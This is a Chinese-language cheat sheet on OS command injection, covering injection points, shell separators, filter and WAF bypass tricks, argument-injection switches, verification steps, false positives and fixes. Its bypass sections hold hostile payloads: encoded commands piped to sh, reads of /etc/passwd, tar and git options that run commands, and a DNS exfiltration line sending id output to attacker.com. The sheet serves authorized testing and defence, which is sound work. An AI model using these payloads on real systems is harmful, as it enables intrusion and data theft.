# 命令注入与绕过

> 目标：证明**服务端执行了攻击者控制的系统命令**。判定关键是"命令执行"而非"字符串回显"。现代目标通常在容器内，注意区分"命令执行成功"与"能在哪执行"。

## 一、注入点

- 文件名处理（转换、压缩、缩略图：`convert`、`ffmpeg`、`tar`、`pdflatex`）
- 网络工具参数（`ping`、`nslookup`、`traceroute`、`whois`、`curl`）
- Git/CI 操作（分支名、commit message、PR 标题）
- 模板/构建流程（`make`、`npm install`（`postinstall`）、`pip`）
- 系统调用拼接（`exec()`、`system()`、`subprocess(shell=True)`、`Runtime.exec(String)`）

## 二、分隔符与语法

| 平台 | 分隔/拼接 |
|---|---|
| 通用 | `;` `&&` `||` `|` 换行 `%0a` |
| 子 shell | `` `cmd` ``、`$(cmd)`、`${IFS}` 替空格 |
| Bash 高级 | `$'\x63\x61\x74'`、`{cat,/etc/passwd}`、`<` 读文件、进程替换 `<(cmd)` |
| Windows CMD | `&` `|` `||` `%20`、`^` 转义、`%COMSPEC%` |
| PowerShell | `;`、`$()`、反引号、`-join`、`IEX` |
| Java | `Runtime.exec(String)` 按空格切分（引号不生效）→ 用 `sh -c` |

## 三、绕过过滤器

1. **空格**：`${IFS}`、`$IFS$9`、`<`、`%09`、Tab、`{cat,/etc/passwd}`。
2. **关键字黑名单**：`c\at`、`c'a't`、`c"a"t`、`/bin/c?t`、`/bin/[c]at`、通配符 `/*/cat`。
3. **斜杠**：`${HOME:0:1}`、`$(echo Lw== | base64 -d)`、环境变量 `$PWD:0:1`。
4. **编码执行**：`base64 -d | sh`、`xxd -r | sh`、`$(printf '\x63\x61\x74')`。
5. **命令替换构造**：`a=c;b=at;$a$b /etc/passwd`、`eval $(echo Y2F0...|base64 -d)`。
6. **无回显**：带外 DNS/HTTP（Interactsh）；时间盲注（`sleep 5`、`ping -c 5`）；写文件后用别的漏洞读；DNS exfil 编码数据（`$(id | base64).attacker.com`）。
7. **参数注入（Argument Injection）**：目标没有直接拼接 shell，但把用户输入当"参数"传给工具 → 用工具自身开关实现效果。
   - `curl`：`-o /path` 写文件、`--config` 读文件、`@file` 上传
   - `tar`：`--checkpoint=1 --checkpoint-action=exec=sh`
   - `git`：`--upload-pack=cmd`、`--output=file`
   - `ssh`：`-o ProxyCommand=...`
   - `find`：`-exec`
   - `ffmpeg`：`-f lavfi`、协议白名单（`http`/`file`/`concat`）
   - `rsync`：`-e`
8. **模板/构建期注入**：`Makefile` 变量、`package.json` 的 `postinstall`、`setup.py` 的 `cmdclass`。

## 四、WAF 与传输层

- 把 payload 放到 WAF 不解析的位置（Header、JSON 深层、multipart filename、路径）。
- 分块传输让分隔符跨 chunk。
- 见 `../WAF-Bypass/README.md` 与 `../WAF-Bypass/Encoding-and-Obfuscation.md`。

## 五、验证（最小证据）

1. 唯一可预测的副作用：输出唯一随机串（`echo <random>`）、写入唯一标记文件、带外回连（含唯一子域/路径）。
2. 时间盲：多次采样与基线对比，排除网络抖动与正常耗时操作。
3. 记录**执行上下文**：谁的身份（`id`/`whoami`）、哪个容器/Pod、可读哪些敏感路径。
4. 断言影响：能否读凭据/环境变量/元数据；能否横向（谨慎，遵守授权）。

## 六、常见误报

- 应用把输入原样回显（反射），未执行。
- 工具自身错误信息包含命令字符串（如 `exec failed: cmd not found`）但未执行。
- 时间差异来自输入长度/网络重传。
- 容器内有 `sleep` 但 `id` 无法执行（受限 shell）→ 影响力需重新评估。

## 七、修复

- 避免 shell：使用参数数组形式的 API（`subprocess.run([...])`、`ProcessBuilder`）。
- 输入白名单（数字、枚举、严格正则），并对工具参数使用 `--` 结束选项解析。
- 禁止把用户输入作为**文件名/路径**或工具开关。
- 最小权限容器、只读文件系统、无凭据挂载、限制 egress。
- 关键流程使用专用库而非系统命令（如用图像库替代 `convert`）。

## 参考

- PortSwigger OS Command Injection、PayloadsAllTheThings Command Injection
- 参数注入：`Argument Injection` 相关研究（`curl`/`tar`/`git` 类）
